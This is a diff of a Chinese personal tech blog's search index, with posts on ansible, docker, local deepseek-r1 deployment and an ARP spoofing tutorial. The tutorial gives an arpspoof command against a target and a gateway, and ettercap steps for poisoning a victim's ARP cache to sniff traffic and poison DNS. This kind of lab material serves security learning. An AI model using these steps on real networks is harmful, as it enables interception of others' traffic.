@@ -1,52 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ansible命令</title>
-    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
-<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装 EPEL 仓库</p>
-<pre><code>yum install epel-release -y
+    <title>arp欺骗</title>
+    <url>/2024/08/01/arpspoof/</url>
+    <content><![CDATA[<h2 id="使用arpspoof命令："><a href="#使用arpspoof命令：" class="headerlink" title="使用arpspoof命令："></a>使用arpspoof命令：</h2><pre><code>arpspoof -i eth0 -t 目标IP地址 网关IP地址
 </code></pre>
-<p>安装 Ansible</p>
-<pre><code>yum install ansible -y
-</code></pre>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前需要定义两个文件：<br>    一个指定需要批量执行的主机hosts.ini，可以随意指定名称；一个指定需要运行的命令和动作command.yml，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</p>
-<p>hosts.ini：</p>
-<pre><code>[hostst_g]
-此处填写ip
-[hosts_g:vars]
-ansible_ssh_user=root ##账号
-ansible_ssh_pass=123456 ##密码
-</code></pre>
-<p>command.yml：</p>
-<pre><code>- name: 在远程主机上执行任意命令 
-    hosts: all
-    gather_facts: no
-    tasks:
-        - name: 执行一个特定命令
-            command: echo &quot;你好，世界！&quot;
-            # 使用 command 模块执行简单命令，不支持管道和重定向
-        - name: 列出目录中的文件
-            command: ls /path/to/directory
-            # 列出指定目录中的所有文件
-        - name: 使用 shell 运行包含管道的命令
-            shell: echo &quot;你好，世界！&quot; | grep 你好
-            # 使用 shell 模块支持管道、变量和重定向等 shell 特性
-        - name: 使用 shell 特性运行命令
-            shell: cat /etc/passwd | grep root
-            # 通过管道过滤包含 &quot;root&quot; 的行
-</code></pre>
-<p>可使用shell：模拟终端上所有执行的命令。</p>
-<p>使用命令</p>
-<pre><code>ansible-playbook -i hosts.ini command.yml
-</code></pre>
+<p>-i interface          指定要使用的接口。<br>-c own|host|both     	指定范围own|host|both（自己|主机|两者）<br>-t target            指定一台特定主机进行ARP（如果未指定，则为LAN上的所有主机）<br>-r						  两个主机(主机和目标)以捕获两个方向的流量。(仅对-t有效)<br>host               指定您希望抓取数据包的host（通常是本地网关）</p>
+<h2 id="使用ettercap-G-蜘蛛工具"><a href="#使用ettercap-G-蜘蛛工具" class="headerlink" title="使用ettercap -G 蜘蛛工具"></a>使用ettercap -G 蜘蛛工具</h2><p>实例演示-arp欺骗</p>
+<p>1.打开ettercap，选择你要使用的网卡，点击”对号”。<br><img src="/images/pasted-4.png" alt="upload successful"></p>
+<p>2.点击”搜索”按钮，进行主机发现。<br><img src="/images/pasted-5.png" alt="upload successful"></p>
+<p>3.点击”红色方框里面的按钮”，我们可以查看”host list”.<br><img src="/images/pasted-6.png" alt="upload successful"></p>
+<p>4.将想要欺骗的网关和受害者分别添加到”add to target 1”和”add to target 2”。<br><img src="/images/pasted-7.png" alt="upload successful"></p>
+<p>5.点击”圆圈”，选择”arp poisoning spoofing”。<br><img src="/images/pasted-8.png" alt="upload successful"></p>
+<p>6.选择”sniff remote connections”，然后点击”OK”。这样就配置完成，ettercap会自动开始arp欺骗。<br><img src="/images/pasted-9.png" alt="upload successful"></p>
+<p>7.我们在受害者主机上可以看到网关的mac地址，已经替换成192.168.3.23的mac地址。<br><img src="/images/pasted-10.png" alt="upload successful"></p>
+<p>攻击成功之后可以让流量经过本机一层代理，可以进行抓包，dns污染等等。</p>
 ]]></content>
       <categories>
-        <category>系统运维</category>
-        <category>linux</category>
+        <category>网络安全</category>
+        <category>kali</category>
       </categories>
       <tags>
-        <tag>linux命令</tag>
+        <tag>网络安全</tag>
+        <tag>kali</tag>
+        <tag>实战演示</tag>
       </tags>
   </entry>
   <entry>
@@ -143,29 +120,52 @@ ansible_ssh_pass=123456 ##密码
       </tags>
   </entry>
   <entry>
-    <title>arp欺骗</title>
-    <url>/2024/08/01/arpspoof/</url>
-    <content><![CDATA[<h2 id="使用arpspoof命令："><a href="#使用arpspoof命令：" class="headerlink" title="使用arpspoof命令："></a>使用arpspoof命令：</h2><pre><code>arpspoof -i eth0 -t 目标IP地址 网关IP地址
+    <title>ansible命令</title>
+    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
+<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装 EPEL 仓库</p>
+<pre><code>yum install epel-release -y
 </code></pre>
-<p>-i interface          指定要使用的接口。<br>-c own|host|both     	指定范围own|host|both（自己|主机|两者）<br>-t target            指定一台特定主机进行ARP（如果未指定，则为LAN上的所有主机）<br>-r						  两个主机(主机和目标)以捕获两个方向的流量。(仅对-t有效)<br>host               指定您希望抓取数据包的host（通常是本地网关）</p>
-<h2 id="使用ettercap-G-蜘蛛工具"><a href="#使用ettercap-G-蜘蛛工具" class="headerlink" title="使用ettercap -G 蜘蛛工具"></a>使用ettercap -G 蜘蛛工具</h2><p>实例演示-arp欺骗</p>
-<p>1.打开ettercap，选择你要使用的网卡，点击”对号”。<br><img src="/images/pasted-4.png" alt="upload successful"></p>
-<p>2.点击”搜索”按钮，进行主机发现。<br><img src="/images/pasted-5.png" alt="upload successful"></p>
-<p>3.点击”红色方框里面的按钮”，我们可以查看”host list”.<br><img src="/images/pasted-6.png" alt="upload successful"></p>
-<p>4.将想要欺骗的网关和受害者分别添加到”add to target 1”和”add to target 2”。<br><img src="/images/pasted-7.png" alt="upload successful"></p>
-<p>5.点击”圆圈”，选择”arp poisoning spoofing”。<br><img src="/images/pasted-8.png" alt="upload successful"></p>
-<p>6.选择”sniff remote connections”，然后点击”OK”。这样就配置完成，ettercap会自动开始arp欺骗。<br><img src="/images/pasted-9.png" alt="upload successful"></p>
-<p>7.我们在受害者主机上可以看到网关的mac地址，已经替换成192.168.3.23的mac地址。<br><img src="/images/pasted-10.png" alt="upload successful"></p>
-<p>攻击成功之后可以让流量经过本机一层代理，可以进行抓包，dns污染等等。</p>
+<p>安装 Ansible</p>
+<pre><code>yum install ansible -y
+</code></pre>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前需要定义两个文件：<br>    一个指定需要批量执行的主机hosts.ini，可以随意指定名称；一个指定需要运行的命令和动作command.yml，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</p>
+<p>hosts.ini：</p>
+<pre><code>[hostst_g]
+此处填写ip
+[hosts_g:vars]
+ansible_ssh_user=root ##账号
+ansible_ssh_pass=123456 ##密码
+</code></pre>
+<p>command.yml：</p>
+<pre><code>- name: 在远程主机上执行任意命令 
+    hosts: all
+    gather_facts: no
+    tasks:
+        - name: 执行一个特定命令
+            command: echo &quot;你好，世界！&quot;
+            # 使用 command 模块执行简单命令，不支持管道和重定向
+        - name: 列出目录中的文件
+            command: ls /path/to/directory
+            # 列出指定目录中的所有文件
+        - name: 使用 shell 运行包含管道的命令
+            shell: echo &quot;你好，世界！&quot; | grep 你好
+            # 使用 shell 模块支持管道、变量和重定向等 shell 特性
+        - name: 使用 shell 特性运行命令
+            shell: cat /etc/passwd | grep root
+            # 通过管道过滤包含 &quot;root&quot; 的行
+</code></pre>
+<p>可使用shell：模拟终端上所有执行的命令。</p>
+<p>使用命令</p>
+<pre><code>ansible-playbook -i hosts.ini command.yml
+</code></pre>
 ]]></content>
       <categories>
-        <category>网络安全</category>
-        <category>kali</category>
+        <category>系统运维</category>
+        <category>linux</category>
       </categories>
       <tags>
-        <tag>网络安全</tag>
-        <tag>kali</tag>
-        <tag>实战演示</tag>
+        <tag>linux命令</tag>
       </tags>
   </entry>
   <entry>
@@ -260,6 +260,79 @@ ansible_ssh_pass=123456 ##密码
         <tag>kali</tag>
         <tag>burpsuite</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>deepseek-r1本地部署方法</title>
+    <url>/2025/02/06/deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="安装ollama"><a href="#安装ollama" class="headerlink" title="安装ollama"></a>安装ollama</h2><p>打开ollama官网，根据系统下载ollama软件：<br><a href="https://ollama.com/">https://ollama.com/</a><br><img src="/images/pasted-76.png" alt="upload successful"></p>
+<h2 id="下载模型"><a href="#下载模型" class="headerlink" title="下载模型"></a>下载模型</h2><p>安装完成ollama后，通过cmd命令行输入运行相关模型的命令，获取地址是官网的Models页面：<br><img src="/images/pasted-77.png" alt="upload successful"></p>
+<p>第一个就是需要下载的模型deepseek-r1，点击名称选择需要的版本，即使不符合也能运行，会很卡：<br><a href="https://ollama.com/library/deepseek-r1:8b">https://ollama.com/library/deepseek-r1:8b</a><br><img src="/images/pasted-78.png" alt="upload successful"></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>运行完成后就能正常使用了，这样只能命令行使用；可以通过浏览器插件图形化页面使用本地运行的模型，插件名称是：Page Assist - A Web UI for Local AI Models<br><img src="/images/pasted-79.png" alt="upload successful"></p>
+<p>说是能联网，但是我的不行</p>
+<p>可以用以下话语添加在问题末尾通过其他联网的ai获取信息后给deepseek整理回答，来间接上网：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请先告诉我你要回答这个问题需要检索哪些关键词或者最新消息？我会尝试提供相关数据。</span><br></pre></td></tr></table></figure>
+
+<h2 id="api参数"><a href="#api参数" class="headerlink" title="api参数"></a>api参数</h2><p>python使用参数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:11434/api/generate&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;model&quot;</span>: <span class="string">&quot;deepseek-r1:1.5b&quot;</span>,  <span class="comment"># 替换为你的模型名称</span></span><br><span class="line">    <span class="string">&quot;prompt&quot;</span>: <span class="string">&quot;你好&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: <span class="literal">False</span>  <span class="comment"># 是否启用流式响应</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>娱乐</category>
+      </categories>
+      <tags>
+        <tag>ai</tag>
+        <tag>deepseek</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker pull 镜像ai的理解</title>
+    <url>/2025/05/27/docker-pull-%E9%95%9C%E5%83%8Fai%E7%9A%84%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<h2 id="🧪-场景"><a href="#🧪-场景" class="headerlink" title="🧪 场景"></a>🧪 场景</h2><p>你执行 docker pull nginx:latest 时，Docker 是怎么一步步“下载镜像”的？<br>我们来把这个过程分解为实际步骤，同时继续用“汉堡 🍔”比喻帮助理解每一层。</p>
+<h3 id="✅-第-1-步：解析镜像名"><a href="#✅-第-1-步：解析镜像名" class="headerlink" title="✅ 第 1 步：解析镜像名"></a>✅ 第 1 步：解析镜像名</h3><p>你输入的命令：<br>docker pull nginx:latest</p>
+<p>Docker 其实会自动转换为：<br>registry-1.docker.io&#x2F;library&#x2F;nginx:latest</p>
+<p>这个地址指的是：</p>
+<ol>
+<li>官方 Docker Hub（registry-1.docker.io）</li>
+<li>官方镜像库（library）</li>
+<li>镜像名：nginx</li>
+<li>标签：latest</li>
+</ol>
+<h3 id="✅-第-2-步：联系-Docker-Hub"><a href="#✅-第-2-步：联系-Docker-Hub" class="headerlink" title="✅ 第 2 步：联系 Docker Hub"></a>✅ 第 2 步：联系 Docker Hub</h3><p>Docker 客户端向 Docker Hub 发出请求：<br>GET &#x2F;v2&#x2F;library&#x2F;nginx&#x2F;manifests&#x2F;latest</p>
+<p>这一步是拿到清单（manifest），这个清单里记录了：</p>
+<ol>
+<li>这个镜像由哪些层组成</li>
+<li>每一层的校验和（sha256）</li>
+<li>每层的大小</li>
+<li>支持的平台（比如 amd64、arm64）</li>
+</ol>
+<blockquote>
+<p>📦 比喻：这就像餐厅菜单告诉你：这个汉堡由 5 层组成，分别是面包、生菜、牛肉、奶酪、酱料。</p>
+</blockquote>
+<h3 id="✅-第-3-步：依次下载每一层（layer）"><a href="#✅-第-3-步：依次下载每一层（layer）" class="headerlink" title="✅ 第 3 步：依次下载每一层（layer）"></a>✅ 第 3 步：依次下载每一层（layer）</h3><p>Docker 开始一个个去下载镜像层（也叫“blob”），请求长这样：<br>GET &#x2F;v2&#x2F;library&#x2F;nginx&#x2F;blobs&#x2F;sha256:xxxxxxxxx</p>
+<ul>
+<li>每一层都是一个压缩包（通常是 tar.gz 文件），里面包含一部分文件系统的变更（新增&#x2F;修改&#x2F;删除文件）。</li>
+</ul>
+<blockquote>
+<p>💡 这些“层”可以是：<br>层编号内容类比<br>Layer 1 Ubuntu OS 的基础文件系统 汉堡面包底<br>Layer 2 安装了一些库 加了生菜<br>Layer 3 加入了 Nginx 服务器 加了牛肉<br>Layer 4 默认配置文件等 加了酱<br>Layer 5 启动命令 插了一根旗子（告诉吃法） </p>
+</blockquote>
+<h3 id="✅-第-4-步：校验层的完整性"><a href="#✅-第-4-步：校验层的完整性" class="headerlink" title="✅ 第 4 步：校验层的完整性"></a>✅ 第 4 步：校验层的完整性</h3><ul>
+<li>每层下载后，Docker 会对文件做 SHA256 校验，确保没有被篡改、损坏。</li>
+</ul>
+<h3 id="✅-第-5-步：将层缓存到本地"><a href="#✅-第-5-步：将层缓存到本地" class="headerlink" title="✅ 第 5 步：将层缓存到本地"></a>✅ 第 5 步：将层缓存到本地</h3><p>层保存到你的本地磁盘：<br>Linux 路径通常是 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;（默认）</p>
+<ul>
+<li>每一层是增量的，可复用（比如多个镜像用的是同一个 ubuntu 基础层）</li>
+</ul>
+<blockquote>
+<p>🧠 你下过 nginx 后再下 redis，可能会发现部分层都已经存在，不需要重新下载。</p>
+</blockquote>
+<h3 id="✅-第-6-步：镜像构建完成，可以运行了"><a href="#✅-第-6-步：镜像构建完成，可以运行了" class="headerlink" title="✅ 第 6 步：镜像构建完成，可以运行了"></a>✅ 第 6 步：镜像构建完成，可以运行了</h3><p>所有层都下载完之后，Docker 会将它们组合起来，做出一个“可以运行的汉堡”。<br>你可以用这个命令运行容器：<br>docker run -d nginx</p>
+<ul>
+<li>此时容器运行的文件系统，其实是多个只读层 + 一个可写层叠加起来的视图。</li>
+</ul>
+<blockquote>
+<p>🧭 下载时你看到的输出，其实就是每一层：<br>比如执行时会看到这样的输出：<br>docker pull nginx:latest<br>latest: Pulling from library&#x2F;nginx<br>ab5ef0e58194: Pull complete     ← 第1层<br>9d6b7f3f1b66: Pull complete     ← 第2层<br>e379e8d9f7cd: Pull complete     ← 第3层<br>…<br>Digest: sha256:xxx…<br>每一条 Pull complete 就是一层成功下载并校验完成了。</p>
+</blockquote>
+<h2 id="✅-小结一句话："><a href="#✅-小结一句话：" class="headerlink" title="✅ 小结一句话："></a>✅ 小结一句话：</h2><p>Docker 下载镜像时，不是一次性拿一个“压缩包”，而是像“叠汉堡”一样，一个个去下载构成镜像的文件系统层（layers），最后组合成可运行的镜像。</p>
+]]></content>
   </entry>
   <entry>
     <title>bash脚本的基础</title>
@@ -531,76 +604,43 @@ ansible_ssh_pass=123456 ##密码
       </tags>
   </entry>
   <entry>
-    <title>docker pull 镜像ai的理解</title>
-    <url>/2025/05/27/docker-pull-%E9%95%9C%E5%83%8Fai%E7%9A%84%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<h2 id="🧪-场景"><a href="#🧪-场景" class="headerlink" title="🧪 场景"></a>🧪 场景</h2><p>你执行 docker pull nginx:latest 时，Docker 是怎么一步步“下载镜像”的？<br>我们来把这个过程分解为实际步骤，同时继续用“汉堡 🍔”比喻帮助理解每一层。</p>
-<h3 id="✅-第-1-步：解析镜像名"><a href="#✅-第-1-步：解析镜像名" class="headerlink" title="✅ 第 1 步：解析镜像名"></a>✅ 第 1 步：解析镜像名</h3><p>你输入的命令：<br>docker pull nginx:latest</p>
-<p>Docker 其实会自动转换为：<br>registry-1.docker.io&#x2F;library&#x2F;nginx:latest</p>
-<p>这个地址指的是：</p>
-<ol>
-<li>官方 Docker Hub（registry-1.docker.io）</li>
-<li>官方镜像库（library）</li>
-<li>镜像名：nginx</li>
-<li>标签：latest</li>
-</ol>
-<h3 id="✅-第-2-步：联系-Docker-Hub"><a href="#✅-第-2-步：联系-Docker-Hub" class="headerlink" title="✅ 第 2 步：联系 Docker Hub"></a>✅ 第 2 步：联系 Docker Hub</h3><p>Docker 客户端向 Docker Hub 发出请求：<br>GET &#x2F;v2&#x2F;library&#x2F;nginx&#x2F;manifests&#x2F;latest</p>
-<p>这一步是拿到清单（manifest），这个清单里记录了：</p>
-<ol>
-<li>这个镜像由哪些层组成</li>
-<li>每一层的校验和（sha256）</li>
-<li>每层的大小</li>
-<li>支持的平台（比如 amd64、arm64）</li>
-</ol>
-<blockquote>
-<p>📦 比喻：这就像餐厅菜单告诉你：这个汉堡由 5 层组成，分别是面包、生菜、牛肉、奶酪、酱料。</p>
-</blockquote>
-<h3 id="✅-第-3-步：依次下载每一层（layer）"><a href="#✅-第-3-步：依次下载每一层（layer）" class="headerlink" title="✅ 第 3 步：依次下载每一层（layer）"></a>✅ 第 3 步：依次下载每一层（layer）</h3><p>Docker 开始一个个去下载镜像层（也叫“blob”），请求长这样：<br>GET &#x2F;v2&#x2F;library&#x2F;nginx&#x2F;blobs&#x2F;sha256:xxxxxxxxx</p>
-<ul>
-<li>每一层都是一个压缩包（通常是 tar.gz 文件），里面包含一部分文件系统的变更（新增&#x2F;修改&#x2F;删除文件）。</li>
-</ul>
-<blockquote>
-<p>💡 这些“层”可以是：<br>层编号内容类比<br>Layer 1 Ubuntu OS 的基础文件系统 汉堡面包底<br>Layer 2 安装了一些库 加了生菜<br>Layer 3 加入了 Nginx 服务器 加了牛肉<br>Layer 4 默认配置文件等 加了酱<br>Layer 5 启动命令 插了一根旗子（告诉吃法） </p>
-</blockquote>
-<h3 id="✅-第-4-步：校验层的完整性"><a href="#✅-第-4-步：校验层的完整性" class="headerlink" title="✅ 第 4 步：校验层的完整性"></a>✅ 第 4 步：校验层的完整性</h3><ul>
-<li>每层下载后，Docker 会对文件做 SHA256 校验，确保没有被篡改、损坏。</li>
-</ul>
-<h3 id="✅-第-5-步：将层缓存到本地"><a href="#✅-第-5-步：将层缓存到本地" class="headerlink" title="✅ 第 5 步：将层缓存到本地"></a>✅ 第 5 步：将层缓存到本地</h3><p>层保存到你的本地磁盘：<br>Linux 路径通常是 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;（默认）</p>
-<ul>
-<li>每一层是增量的，可复用（比如多个镜像用的是同一个 ubuntu 基础层）</li>
-</ul>
-<blockquote>
-<p>🧠 你下过 nginx 后再下 redis，可能会发现部分层都已经存在，不需要重新下载。</p>
-</blockquote>
-<h3 id="✅-第-6-步：镜像构建完成，可以运行了"><a href="#✅-第-6-步：镜像构建完成，可以运行了" class="headerlink" title="✅ 第 6 步：镜像构建完成，可以运行了"></a>✅ 第 6 步：镜像构建完成，可以运行了</h3><p>所有层都下载完之后，Docker 会将它们组合起来，做出一个“可以运行的汉堡”。<br>你可以用这个命令运行容器：<br>docker run -d nginx</p>
-<ul>
-<li>此时容器运行的文件系统，其实是多个只读层 + 一个可写层叠加起来的视图。</li>
-</ul>
-<blockquote>
-<p>🧭 下载时你看到的输出，其实就是每一层：<br>比如执行时会看到这样的输出：<br>docker pull nginx:latest<br>latest: Pulling from library&#x2F;nginx<br>ab5ef0e58194: Pull complete     ← 第1层<br>9d6b7f3f1b66: Pull complete     ← 第2层<br>e379e8d9f7cd: Pull complete     ← 第3层<br>…<br>Digest: sha256:xxx…<br>每一条 Pull complete 就是一层成功下载并校验完成了。</p>
-</blockquote>
-<h2 id="✅-小结一句话："><a href="#✅-小结一句话：" class="headerlink" title="✅ 小结一句话："></a>✅ 小结一句话：</h2><p>Docker 下载镜像时，不是一次性拿一个“压缩包”，而是像“叠汉堡”一样，一个个去下载构成镜像的文件系统层（layers），最后组合成可运行的镜像。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>deepseek-r1本地部署方法</title>
-    <url>/2025/02/06/deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="安装ollama"><a href="#安装ollama" class="headerlink" title="安装ollama"></a>安装ollama</h2><p>打开ollama官网，根据系统下载ollama软件：<br><a href="https://ollama.com/">https://ollama.com/</a><br><img src="/images/pasted-76.png" alt="upload successful"></p>
-<h2 id="下载模型"><a href="#下载模型" class="headerlink" title="下载模型"></a>下载模型</h2><p>安装完成ollama后，通过cmd命令行输入运行相关模型的命令，获取地址是官网的Models页面：<br><img src="/images/pasted-77.png" alt="upload successful"></p>
-<p>第一个就是需要下载的模型deepseek-r1，点击名称选择需要的版本，即使不符合也能运行，会很卡：<br><a href="https://ollama.com/library/deepseek-r1:8b">https://ollama.com/library/deepseek-r1:8b</a><br><img src="/images/pasted-78.png" alt="upload successful"></p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>运行完成后就能正常使用了，这样只能命令行使用；可以通过浏览器插件图形化页面使用本地运行的模型，插件名称是：Page Assist - A Web UI for Local AI Models<br><img src="/images/pasted-79.png" alt="upload successful"></p>
-<p>说是能联网，但是我的不行</p>
-<p>可以用以下话语添加在问题末尾通过其他联网的ai获取信息后给deepseek整理回答，来间接上网：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请先告诉我你要回答这个问题需要检索哪些关键词或者最新消息？我会尝试提供相关数据。</span><br></pre></td></tr></table></figure>
+    <title>docker pull 镜像失败问题解决方法（镜像多）</title>
+    <url>/2024/08/13/docker-pull-%E9%95%9C%E5%83%8F%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%88%E9%95%9C%E5%83%8F%E5%A4%9A%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>1、下载无法开始、重试、超时，这个问题更换可用的docker镜像仓库即可。</p>
+<p>2、经常下载到一半没办法进行，卡在小镜像等等中途无法下载的情况。</p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>这次解决中发现docker分两个服务，docker.server和docker.socket，这次只停掉docker.server，然后使用参数让每次下载个数为1，即可解决。</p>
+<h3 id="停止docker服务"><a href="#停止docker服务" class="headerlink" title="停止docker服务"></a>停止docker服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>
 
-<h2 id="api参数"><a href="#api参数" class="headerlink" title="api参数"></a>api参数</h2><p>python使用参数</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:11434/api/generate&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;model&quot;</span>: <span class="string">&quot;deepseek-r1:1.5b&quot;</span>,  <span class="comment"># 替换为你的模型名称</span></span><br><span class="line">    <span class="string">&quot;prompt&quot;</span>: <span class="string">&quot;你好&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: <span class="literal">False</span>  <span class="comment"># 是否启用流式响应</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+<h3 id="参数修改下载数"><a href="#参数修改下载数" class="headerlink" title="参数修改下载数"></a>参数修改下载数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dockerd --max-concurrent-downloads 1</span><br></pre></td></tr></table></figure>
+
+<h3 id="开始下载"><a href="#开始下载" class="headerlink" title="开始下载"></a>开始下载</h3><p>运行后，不要按ctrl+c停止，因为停掉之后就等于docker停了，所以要在新的窗口中运行docker pull下载镜像，就能看到下载时一次只下载一个layer了</p>
+]]></content>
       <categories>
         <category>系统运维</category>
-        <category>娱乐</category>
+        <category>docker</category>
       </categories>
       <tags>
-        <tag>ai</tag>
-        <tag>deepseek</tag>
+        <tag>docker</tag>
+        <tag>docker命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker 卸载</title>
+    <url>/2024/08/13/docker-%E5%8D%B8%E8%BD%BD/</url>
+    <content><![CDATA[<h4 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
+<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">          docker-client \</span><br><span class="line">          docker-client-latest \</span><br><span class="line">          docker-common \</span><br><span class="line">          docker-latest \</span><br><span class="line">          docker-latest-logrotate \</span><br><span class="line">          docker-logrotate \</span><br><span class="line">          docker-selinux \</span><br><span class="line">          docker-engine-selinux \</span><br><span class="line">          docker-engine</span><br></pre></td></tr></table></figure>
+<p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
+<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce \</span><br><span class="line">          docker-ce-cli \</span><br><span class="line">          containerd</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">rm -rf /etc/systemd/system/docker.service.d</span><br><span class="line">rm -rf /etc/systemd/system/docker.service</span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line">rm -rf /var/<span class="keyword">run</span><span class="language-bash">/docker</span></span><br><span class="line">rm -rf /usr/local/docker</span><br><span class="line">rm -rf /etc/docker</span><br><span class="line">rm -rf /usr/bin/docker* /usr/bin/containerd* /usr/bin/runc /usr/bin/ctr</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>docker命令</tag>
       </tags>
   </entry>
   <entry>
@@ -672,110 +712,11 @@ mysql:5.7
       </tags>
   </entry>
   <entry>
-    <title>docker pull 镜像失败问题解决方法（镜像多）</title>
-    <url>/2024/08/13/docker-pull-%E9%95%9C%E5%83%8F%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%88%E9%95%9C%E5%83%8F%E5%A4%9A%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>1、下载无法开始、重试、超时，这个问题更换可用的docker镜像仓库即可。</p>
-<p>2、经常下载到一半没办法进行，卡在小镜像等等中途无法下载的情况。</p>
-<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>这次解决中发现docker分两个服务，docker.server和docker.socket，这次只停掉docker.server，然后使用参数让每次下载个数为1，即可解决。</p>
-<h3 id="停止docker服务"><a href="#停止docker服务" class="headerlink" title="停止docker服务"></a>停止docker服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>
-
-<h3 id="参数修改下载数"><a href="#参数修改下载数" class="headerlink" title="参数修改下载数"></a>参数修改下载数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dockerd --max-concurrent-downloads 1</span><br></pre></td></tr></table></figure>
-
-<h3 id="开始下载"><a href="#开始下载" class="headerlink" title="开始下载"></a>开始下载</h3><p>运行后，不要按ctrl+c停止，因为停掉之后就等于docker停了，所以要在新的窗口中运行docker pull下载镜像，就能看到下载时一次只下载一个layer了</p>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>docker命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker 卸载</title>
-    <url>/2024/08/13/docker-%E5%8D%B8%E8%BD%BD/</url>
-    <content><![CDATA[<h4 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
-<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">          docker-client \</span><br><span class="line">          docker-client-latest \</span><br><span class="line">          docker-common \</span><br><span class="line">          docker-latest \</span><br><span class="line">          docker-latest-logrotate \</span><br><span class="line">          docker-logrotate \</span><br><span class="line">          docker-selinux \</span><br><span class="line">          docker-engine-selinux \</span><br><span class="line">          docker-engine</span><br></pre></td></tr></table></figure>
-<p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
-<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce \</span><br><span class="line">          docker-ce-cli \</span><br><span class="line">          containerd</span><br></pre></td></tr></table></figure>
-
-<hr>
